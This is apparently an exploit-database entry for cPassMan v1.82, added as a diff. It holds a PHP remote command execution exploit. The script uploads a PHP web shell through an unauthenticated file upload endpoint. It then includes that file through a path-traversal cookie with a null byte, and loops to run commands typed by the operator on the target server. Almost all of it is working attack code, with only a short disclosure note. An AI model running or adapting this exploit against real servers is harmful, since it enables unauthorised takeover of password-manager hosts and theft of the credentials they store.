@@ -1,0 +1,104 @@
+Product.                       Collaborative Passwords Manager (cPassMan)
+Platform.                      Independent (PHP)
+Affected versions.             1.82
+
+<?php
+/*
+ * cPassMan v1.82 Remote Command Execution Exploit by ls (contact@kaankivilcim.com)
+ * Disclaimer: cPassMan developer was notified of vulnerabilities in April 2011 and advised that v1.x was no longer supported.
+ * Note: Requires PHP 5.3.3 or lower due to the use of a poison null byte in the LFI.
+ */
+
+if ($argc < 3) {
+  print "Usage: php -f {$argv[0]} <host> <path> (e.g. php -f {$argv[0]} 192.168.129.130 /cpassman)\n";
+  exit();
+}
+
+print "--------------------------------------------------------------------------------\n";
+print "cPassMan v1.82 Remote Command Execution Exploit by ls (contact@kaankivilcim.com)\n";
+print "--------------------------------------------------------------------------------\n";
+
+$host = $argv[1];
+$path = $argv[2];
+
+$port = 80;
+
+/*
+ * Stage One: Unauthenticated Arbitrary File Upload
+ * Uploaded files are stored in the document root of the web server as a file with the MD5 hash of the original filename.
+ */
+
+print "[*] Stage One: Uploading command execution handler... ";
+
+$upload_path = $path . "/includes/libraries/uploadify/uploadify.php";
+$fp = fsockopen($host, $port, $errno, $errstr, 30);
+
+if ($fp) {
+  fputs($fp, "POST $upload_path HTTP/1.1\r\n");
+  fputs($fp, "Host: $host\r\n");
+  fputs($fp, "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n");
+  fputs($fp, "Content-Length: 233\r\n\r\n");
+  fputs($fp, "-----------------------------4827543632391\r\n");
+  fputs($fp, "Content-Disposition: form-data; name=\"Filedata\"; filename=\"rabbit.txt\";\r\n");
+  fputs($fp, "Content-Type: text/plain\r\n\r\n");
+  fputs($fp, "<?php echo system(\$_GET['z']); die(); ?>\r\n");
+  fputs($fp, "-----------------------------4827543632391--\r\n\r\n");
+
+  $result = fgets($fp, 16);
+  fclose($fp);
+}
+
+if (strstr($result, "200 OK")) {
+  print "Success!\n";
+}
+
+/*
+ * Stage Two: Local File Inclusion
+ * Several LFI vulnerabilities exist in the user language selection functionality. The exploit uses the user_language cookie attack vector.
+ */
+
+print "[*] Stage Two: Confirming command execution via local file inclusion... ";
+
+$cmd = "echo rabbit";
+$success = FALSE;
+
+$stdin = fopen("php://stdin","r");
+
+do {
+  $cmd = str_replace(" ", "+", $cmd);
+  $lfi_path = $path . "/index.php?z=" . $cmd;
+
+  $fp = fsockopen($host, $port, $errno, $errstr, 30);
+  
+  if ($fp) {
+    fputs($fp, "GET $lfi_path HTTP/1.1\r\n");
+    fputs($fp, "Host: 192.168.129.130\r\n");
+    fputs($fp, "Cookie: user_language=../../../89f84a8775dd8f60cdbdef0d73919511%00\r\n");
+    fputs($fp, "Content-Length: 0\r\n\r\n");
+  
+    for ($i = 0; $i < 13; $i++) {
+      fgets($fp, 2048);
+    }
+  
+    $output = "\n";
+
+    while (($tmp = fgets($fp, 2048)) != FALSE && !feof($fp)) {
+      $output .= $tmp;
+    }
+
+    if ($success) {
+      echo $output;
+    }
+  
+    fclose($fp);
+  }
+
+  if (!$success && strstr($output, "rabbit")) {
+    $success = TRUE;
+    print "Success!\n";
+  }
+
+  print "\n> ";
+} while ($cmd = trim(fgets($stdin)));
+?>
+
